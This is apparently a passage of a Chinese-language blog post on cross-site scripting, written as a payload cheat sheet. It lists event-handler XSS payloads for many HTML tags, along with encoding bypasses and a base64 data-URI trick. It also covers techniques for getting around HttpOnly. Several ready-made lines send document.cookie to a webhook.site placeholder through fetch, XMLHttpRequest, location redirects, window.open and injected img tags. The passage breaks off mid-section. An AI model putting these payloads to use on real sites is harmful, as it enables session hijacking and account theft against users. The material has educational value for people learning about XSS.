+<h3 id="标签-2"><a href="#标签-2" class="headerlink" title="&lt;audio&gt; 标签"></a><code>&lt;audio&gt;</code> 标签</h3><p><code>&lt;audio&gt;</code> 标签定义声音，比如音乐或其他音频流。</p>
+<p><strong>对应属性：</strong></p>
+<p><code>onerror</code>（加载错误时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio src=1 onerror=alert(1)&gt;</span><br><span class="line">&lt;audio&gt;&lt;source src=&quot;x&quot; onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls onfocus=eval(&quot;alert(&#x27;xss&#x27;);&quot;) autofocus=&quot;&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;audio controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;source src=&quot;x&quot;&gt;&lt;/audio&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-3"><a href="#标签-3" class="headerlink" title="&lt;video&gt;标签"></a><code>&lt;video&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onerror</code>（加载错误时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;video&gt;&lt;source onerror=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video controls onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/video&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-4"><a href="#标签-4" class="headerlink" title="&lt;svg&gt; 标签"></a><code>&lt;svg&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onload</code>（加载完成时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=javascript:alert(1)&gt;</span><br><span class="line">&lt;svg onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-5"><a href="#标签-5" class="headerlink" title="&lt;button&gt; 标签"></a><code>&lt;button&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=alert(1)&gt;</span><br><span class="line">&lt;button onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseup</code>（鼠标按钮释放时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmousedown</code>（鼠标按钮按下时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onmousedown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/button&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-6"><a href="#标签-6" class="headerlink" title="&lt;div&gt;标签"></a><code>&lt;div&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<p>这个需要借助url编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原代码：</span><br><span class="line">&lt;div onmouseover=&#x27;alert(1)&#x27;&gt;DIV&lt;/div&gt;</span><br><span class="line">经过url编码：</span><br><span class="line">&lt;div onmouseover%3d&#x27;alert%26lpar%3b1%26rpar%3b&#x27;&gt;DIV&lt;%2fdiv&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-7"><a href="#标签-7" class="headerlink" title="&lt;object&gt;标签"></a><code>&lt;object&gt;</code>标签</h3><p>这个需要借助 data 伪协议和 base64 编码来实现绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;object data=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=&quot;&gt;&lt;/object&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-8"><a href="#标签-8" class="headerlink" title="&lt;script&gt; 标签"></a><code>&lt;script&gt;</code> 标签</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(/xss/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;alert(123)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-9"><a href="#标签-9" class="headerlink" title="&lt;p&gt; 标签"></a><code>&lt;p&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;xss&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-10"><a href="#标签-10" class="headerlink" title="&lt;input&gt; 标签"></a><code>&lt;input&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onclick</code>（点击时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onclick=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br><span class="line">&lt;input onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onkeydown</code>（键盘按键按下时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; onkeydown=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onkeydown</code>（在键盘按键按下并释放一个键时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=&quot;text&quot; onkeypress=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/input&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-11"><a href="#标签-11" class="headerlink" title="&lt;details&gt;标签"></a><code>&lt;details&gt;</code>标签</h3><p><strong>对应属性：</strong></p>
+<p><code>ontoggle</code>（切换时触发XSS，如:详情元素展开或收起）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/details&gt;</span><br><span class="line">&lt;details ontoggle=&quot;alert(&#x27;xss&#x27;);&quot; open=&quot;&quot;&gt;&lt;/details&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-12"><a href="#标签-12" class="headerlink" title="&lt;select&gt; 标签"></a><code>&lt;select&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onfocus</code>（获取焦点时触发XSS，如:点击）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onfocus=&quot;alert(&#x27;xss&#x27;);&quot; autofocus&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onclick</code>（点击时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;select onclick=eval(&quot;alert(&#x27;xss&#x27;);&quot;)&gt;&lt;/select&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-13"><a href="#标签-13" class="headerlink" title="&lt;form&gt; 标签"></a><code>&lt;form&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onmouseover</code>（鼠标悬停于该元素时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseover=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseout</code>（鼠标移出时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseout=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>onmouseup</code>（鼠标按钮释放时触发XSS）。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;x&quot; action=&quot;x&quot; onmouseup=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>action</code>（提交表单时触发）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=javascript:alert(1)&gt;&lt;input type=submit&gt;&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="标签-14"><a href="#标签-14" class="headerlink" title="&lt;body&gt; 标签"></a><code>&lt;body&gt;</code> 标签</h3><p><strong>对应属性：</strong></p>
+<p><code>onload</code>（加载完成时触发XSS）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;alert(&#x27;xss&#x27;);&quot;&gt;&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h1 id="外带COOKIE"><a href="#外带COOKIE" class="headerlink" title="外带COOKIE"></a>外带COOKIE</h1><h2 id="获取cookie"><a href="#获取cookie" class="headerlink" title="获取cookie"></a>获取cookie</h2><h3 id="未设置为HttpOnly"><a href="#未设置为HttpOnly" class="headerlink" title="未设置为HttpOnly"></a>未设置为HttpOnly</h3><h4 id="方法：document-cookie"><a href="#方法：document-cookie" class="headerlink" title="方法：document.cookie"></a>方法：document.cookie</h4><p>可获得所有的 <code>Cookie</code>，每条 <code>cookie</code> 以<code>分号和空格 </code>分隔 (即， <code>key=value</code> 键值对)。例如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=a378eb5d1c4e12d492e63273f7b68c01%40devS; language=zh; _gat=1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="设置为HttpOnly"><a href="#设置为HttpOnly" class="headerlink" title="设置为HttpOnly"></a>设置为HttpOnly</h3><blockquote>
+<p><code>HttpOnly</code>是包含在<code>Set-Cookie HTTP</code>响应头文件中的附加标志。生成cookie时使用<code>HttpOnly</code>标志有助于降低客户端脚本访问受保护<code>cookie</code>的风险（如果浏览器支持）。</p>
+<p>即如果某一个Cookie 选项被设置成 <code>HttpOnly = true</code> 的话，那此<code>Cookie</code> <strong>只能通过服务器端修改，Js 是操作不了的</strong>，此时<code>document.cookie</code> 无效。</p>
+</blockquote>
+<h4 id="方法一：cookie回显页面"><a href="#方法一：cookie回显页面" class="headerlink" title="方法一：cookie回显页面"></a>方法一：cookie回显页面</h4><p>利用服务器中的cookie回显页面，如：<code>PHPinfo</code>页面</p>
+<p>**条件：**有相关请求页面可以回显出cookie</p>
+<p><strong>参考链接</strong>：<a target="_blank" rel="noopener" href="https://hackcommander.github.io/posts/2022/11/12/bypass-httponly-via-php-info-page">How to bypass the HttpOnly flag via the PHP info page to exfiltrate the user cookies during an XSS exploitation</a></p>
+<h4 id="方法二：TRACE-HTTP"><a href="#方法二：TRACE-HTTP" class="headerlink" title="方法二：TRACE HTTP"></a>方法二：TRACE HTTP</h4><blockquote>
+<p>HTTP定义了8种标准的请求方法，包括<code>GET</code>、<code>POST</code>、<code>PUT</code>、<code>DELETE</code>、<code>HEAD</code>、<code>OPTIONS</code>、<code>TRACE</code>和<code>CONNECT</code>。其中<code>TRACE</code>用于回显服务器收到的请求。</p>
+</blockquote>
+<p>**条件：**服务器支持<code>TRACE</code>方式请求</p>
+<p><strong>注</strong>：现代浏览器不允许从 JS 发送 TRACE 请求，从而避免了这种技术。但是，在特定软件中发现了一些绕过此方法的方法，例如发送 <code>\r\nTRACE</code> 而不是 <code>TRACE</code> 发送到 IE6.0 SP2。</p>
+<h4 id="方法三：-Cookie-Jar-溢出"><a href="#方法三：-Cookie-Jar-溢出" class="headerlink" title="方法三： Cookie Jar 溢出"></a>方法三： Cookie Jar 溢出</h4><p><strong>参考链接</strong>：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/hacking-with-cookies/cookie-jar-overflow">Cookie Jar Overflow</a>、<a target="_blank" rel="noopener" href="https://medium.com/@ibm_ptc_security/cookie-jar-overflow-attack-ae5135b6100">Cookie Jar Overflow Attack</a></p>
+<h4 id="方法四：表单劫持"><a href="#方法四：表单劫持" class="headerlink" title="方法四：表单劫持"></a>方法四：表单劫持</h4><p>XSS能插入在登录表单页面，能直接获取登录的账号密码，使用账号密码登录</p>
+<h4 id="方法五：浏览器漏洞、中间件漏洞"><a href="#方法五：浏览器漏洞、中间件漏洞" class="headerlink" title="方法五：浏览器漏洞、中间件漏洞"></a>方法五：浏览器漏洞、中间件漏洞</h4><p>例如：Apache服务器漏洞 CVE-2012-0053</p>
+<p>影响版本：2.2.0-2.2.21</p>
+<p>攻击者可通过向网站植人超大的Cookie,令其HTTP头超过Apache的<code>LititRequestFieldSize</code> (最大请求长度，4192字节)，使得Apache返回400错误，状态页中包含了<code>HttpOnly</code> 保护的Cookie。</p>
+<h2 id="带出cookie"><a href="#带出cookie" class="headerlink" title="带出cookie"></a>带出cookie</h2><h4 id="fetch-方法"><a href="#fetch-方法" class="headerlink" title="fetch()方法"></a>fetch()方法</h4><p>全局的 <code>fetch()</code> 方法用于发起获取资源的请求。它返回一个 promise，这个 promise 会在请求响应后被 resolve，并传回 <code>Response</code>对象。例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;//webhook.site/xxxxxxxx/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>)</span><br></pre></td></tr></table></figure>
+
+<p>详细参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/fetch">fetch() - Web API 接口参考 | MDN (mozilla.org)</a></p>
+<h4 id="XMLHttpRequest-对象"><a href="#XMLHttpRequest-对象" class="headerlink" title="XMLHttpRequest 对象"></a>XMLHttpRequest 对象</h4><p>利用 <code>XMLHttpRequest</code> 对象发送 HTTP 请求，将 Cookie 数据发送到攻击者的服务器：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="keyword">var</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>, <span class="literal">true</span>); xhr.<span class="title function_">send</span>();&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>详细参考：<a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">XMLHttpRequest - Web API 接口参考 | MDN (mozilla.org)</a></p>
+<h4 id="window-location-对象"><a href="#window-location-对象" class="headerlink" title="window.location 对象"></a>window.location 对象</h4><p> <code>window.location</code> 可以把浏览器重定向到新的页面，此时可通过url携带cookie；使用方法例如：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>=<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>下面是<code>window.location</code> 对象中<strong>可用于跳转的方法</strong>：</p>
+<ol>
+<li><code>window.location.href</code>：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span> = <span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>window.location.assign(url)</code>：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">assign</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><code>window.location.replace(url)</code>：</li>
+</ol>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span>.<span class="title function_">replace</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="window-open方法"><a href="#window-open方法" class="headerlink" title="window.open方法"></a>window.open方法</h4><p><code>window.open()</code> 是 JavaScript 中用于<strong>打开新窗口或新标签页</strong>的方法。它接受一个 URL 作为参数，返回一个新的浏览器窗口对象或者选项卡对象。</p>
+<p>例如，以下代码将会在新窗口或新标签页中打开指定 URL：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&quot;//webhook.site/xxxxxxxx/?cookie=&quot;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="document-write方法"><a href="#document-write方法" class="headerlink" title="document.write方法"></a>document.write方法</h4><p>利用 <code>document.write</code> 写入某些含有src属性的标签，并将Cookie拼接到目标URL中，作为参数发送到指定的 IP 地址和端口</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=<span class="subst">$&#123;<span class="variable language_">document</span>.cookie&#125;</span>&quot; &gt;`</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;img src=&quot;//webhook.site/xxxxxxxx/?cookie=&#x27;</span>+<span class="variable language_">document</span>.<span class="property">cookie</span>+<span class="string">&#x27;&quot;/&gt;&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="附：带src属性的标签"><a href="#附：带src属性的标签" class="headerlink" title="附：带src属性的标签"></a>附：带src属性的标签</h5><ol>
+<li><p><strong><code>&lt;img&gt;</code></strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;image.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;示例图片&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>&lt;script&gt;</code></strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;script.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>&lt;iframe&gt;</code></strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;page.html&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>&lt;video&gt;</code></strong> 和 <strong><code>&lt;audio&gt;</code></strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">video</span> <span class="attr">src</span>=<span class="string">&quot;video.mp4&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">video</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;audio.mp3&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong><code>&lt;embed&gt;</code></strong> 和 <strong><code>&lt;object&gt;</code></strong>：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">embed</span> <span class="attr">src</span>=<span class="string">&quot;file.pdf&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/pdf&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">&quot;file.swf&quot;</span> <span class="attr">type</span>=<span class="string">&quot;application/x-shockwave-flash&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="更多正在学习中…"><a href="#更多正在学习中…" class="headerlink" title="更多正在学习中….."></a>更多正在学习中…..</h4><p>jquery-ajax</p>
+<p>iCeServer</p>
+<p>Superagent</p>
+<p>socket</p>
+<p>axios</p>
+<ol>
+<li>jQuery AJAX</li>
+</ol>
+<p>首先确保你的项目中已经包含了jQuery。如果没有，你可以通过添加以下标签来引入：</p>
+<p>html</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>发送请求的示例代码：</p>
+<p>javascript</p>
